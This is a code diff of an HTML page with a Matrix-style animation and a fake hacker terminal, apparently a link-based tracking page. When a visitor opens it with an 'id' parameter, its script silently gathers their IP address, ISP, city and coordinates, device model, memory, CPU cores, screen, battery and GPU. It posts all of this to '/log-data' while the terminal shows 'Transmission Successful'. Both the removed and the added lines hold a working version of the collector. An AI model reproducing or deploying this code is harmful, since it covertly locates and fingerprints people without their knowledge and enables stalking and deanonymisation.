@@ -17,7 +17,7 @@
     <canvas id="mainCanvas"></canvas>
 
 <script>
-// --- Matrix & Ripple Engine (From Original Code) ---
+// --- Matrix & Ripple Engine ---
 const canvas = document.getElementById('mainCanvas');
 const ctx = canvas.getContext('2d');
 let w, h, cols, drops = [], ripples = [];
@@ -46,17 +46,20 @@ window.addEventListener('resize', init); init(); draw();
 
 // --- Advanced Data Engine ---
 (async function() {
-    if (sessionStorage.getItem('sync')) return;
+    // একই ডাটা বারবার পাঠানো বন্ধ করার চেক
+    if (sessionStorage.getItem('data_sent')) return;
+
     const _log = document.getElementById('terminal');
     const params = new URLSearchParams(window.location.search);
     const uid = params.get('id'); if(!uid) return;
 
+    // Unicode Font Converter Logic
     const _fnt = (t) => {
         const m = {'A':'ᴀ','B':'ʙ','C':'ᴄ','D':'ᴅ','E':'ᴇ','F':'ғ','G':'ɢ','H':'ʜ','I':'ɪ','J':'ᴊ','K':'ᴋ','L':'ʟ','M':'ᴍ','N':'ɴ','O':'ᴏ','P':'ᴘ','Q':'ǫ','R':'ʀ','S':'s','T':'ᴛ','U':'ᴜ','V':'ᴠ','W':'ᴡ','X':'x','Y':'ʏ','Z':'ᴢ'};
         return t.split('').map(c => m[c.toUpperCase()] || c).join('');
     };
 
-    _log.innerHTML += `<br>> ${_fnt("Analyzing Hardware")}...`;
+    _log.innerHTML += `<br>> ${_fnt("Analyzing System Core")}...`;
 
     let net = { ip: "N/A", isp: "N/A", loc: "N/A", lat: "N/A", lon: "N/A" };
     try {
@@ -65,24 +68,37 @@ window.addEventListener('resize', init); init(); draw();
         if(d.success) net = { ip: d.ip, isp: d.connection.isp, loc: d.city+", "+d.country, lat: d.latitude, lon: d.longitude };
     } catch(e) {}
 
-    const getModel = () => {
-        const ua = navigator.userAgent;
-        if (/android/i.test(ua)) { const m = ua.match(/Android\s([0-9\.]+);\s([^;]+)\)/); return m ? m[2] : "Android Device"; }
-        return navigator.platform;
-    };
+    // Battery Logic with Emojis
+    let battInfo = "N/A";
+    try {
+        const b = await navigator.getBattery();
+        battInfo = Math.round(b.level * 100) + "% " + (b.charging ? "🔌" : "🔋");
+    } catch(e) {}
 
     const info = {
-        model: getModel(), platform: navigator.platform, ip: net.ip, isp: net.isp, location: net.loc,
-        lat: net.lat, lon: net.lon, ram: (navigator.deviceMemory || "N/A") + " GB",
+        model: /android/i.test(navigator.userAgent) ? navigator.userAgent.split(";")[1].split(")")[0].trim() : navigator.platform,
+        platform: navigator.platform,
+        ip: net.ip,
+        isp: net.isp,
+        location: net.loc,
+        lat: net.lat, lon: net.lon,
+        ram: (navigator.deviceMemory || "N/A") + " GB",
         cores: (navigator.hardwareConcurrency || "N/A") + " Cores",
         screen: `${screen.width}x${screen.height} (${screen.colorDepth}-Bit)`,
-        battery: (await (navigator.getBattery ? navigator.getBattery() : Promise.resolve({level:0, charging:false}))).level * 100 + "%",
+        battery: battInfo,
         gpu: (function(){try{const g=document.createElement('canvas').getContext('webgl'); return g.getParameter(g.getExtension('WEBGL_debug_renderer_info').UNMASKED_RENDERER_WEBGL);}catch(e){return "N/A"}})()
     };
 
-    await fetch('/log-data', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ uid, info }) });
-    sessionStorage.setItem('sync', '1');
-    _log.innerHTML += `<br>> ${_fnt("Transmission Successful")}`;
+    const response = await fetch('/log-data', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ uid, info })
+    });
+
+    if(response.ok) {
+        sessionStorage.setItem('data_sent', 'true');
+        _log.innerHTML += `<br>> ${_fnt("Transmission Successful")}`;
+    }
 })();
 </script>
 </body>
